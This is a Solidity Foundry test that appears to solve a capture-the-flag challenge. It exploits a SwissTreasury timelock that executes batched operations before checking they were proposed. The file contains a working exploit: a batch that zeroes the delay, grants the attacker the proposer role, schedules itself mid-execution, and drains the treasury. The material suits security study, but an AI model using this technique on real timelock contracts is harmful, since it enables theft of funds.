// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.4;

import "forge-std/Test.sol";
import "../contracts/Setup.sol";
import "../contracts/SwissTreasury.sol";

contract SwissTreasuryTest is Test {
    Setup setup;
    SwissTreasury swissTreasury;

    function setUp() public {
        setup = new Setup{value: 1 ether}();
        swissTreasury = setup.instance();
    }

    /**
    TimelockController is not only its own admin, but also, it executes operations first before checking if the operation was indeed proposed in the first place. (SwissTreasury specifies this EXECUTOR_ROLE to be open)

    If an operation was executed to grant Proposer role to attacker, then the attacker proposed the operation before call end, it will actually legitimise any operation.

    Here's the attack steps with batched timelock transaction:

    0. Reduce delay to 0
    1. Grant PROPOSER_ROLE to attacker contract (possible because contract itself is role admin for PROPOSER_ROLE)
    2. Propose operation from attacker contract, now that #1 has granted attacker PROPOSER_ROLE
    3. Execute `distributeFunds()` on SwissTreasury 
     */
    function testAttack() external {
        vm.warp(7 days); // block.timestamp would be 1 initially in this test, but TimelockController would timestamp = 1 as not ready. So, block.timestamp is manually set to any value other than 1

        // Attack
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory datas = new bytes[](4);
        bytes32 predecessor;
        bytes32 salt;
        (targets, values, datas, predecessor, salt) = _generatePayload();
        swissTreasury.executeBatch(targets, values, datas, predecessor, salt);

        // Check attack success
        require(setup.isSolved(), "NOT SOLVED");
    }

    function proposeOperation() external {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory datas = new bytes[](4);
        bytes32 predecessor;
        bytes32 salt;
        (targets, values, datas, predecessor, salt) = _generatePayload();
        swissTreasury.scheduleBatch(targets, values, datas, predecessor, salt, 0);
    }

    //////////////////////
    // HELPERS ///////////
    //////////////////////

    function _generatePayload()
        internal
        view
        returns (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory datas,
            bytes32 predecessor,
            bytes32 salt
        )
    {
        targets = new address[](4);
        values = new uint256[](4);
        datas = new bytes[](4);

        // Payload for 0
        targets[0] = address(swissTreasury);
        datas[0] = abi.encodeWithSignature(
            "updateDelay(uint256)",
            0
        );

        // Payload for 1
        targets[1] = address(swissTreasury);
        datas[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            swissTreasury.PROPOSER_ROLE(),
            address(this)
        );

        // Payload for 2
        targets[2] = address(this);
        datas[2] = abi.encodeWithSignature("proposeOperation()");

        // Payload for 3
        targets[3] = address(swissTreasury);
        datas[3] = abi.encodeWithSignature(
            "distributeFunds(address,uint256)",
            address(this),
            address(swissTreasury).balance
        );
    }

    receive() external payable {}
}
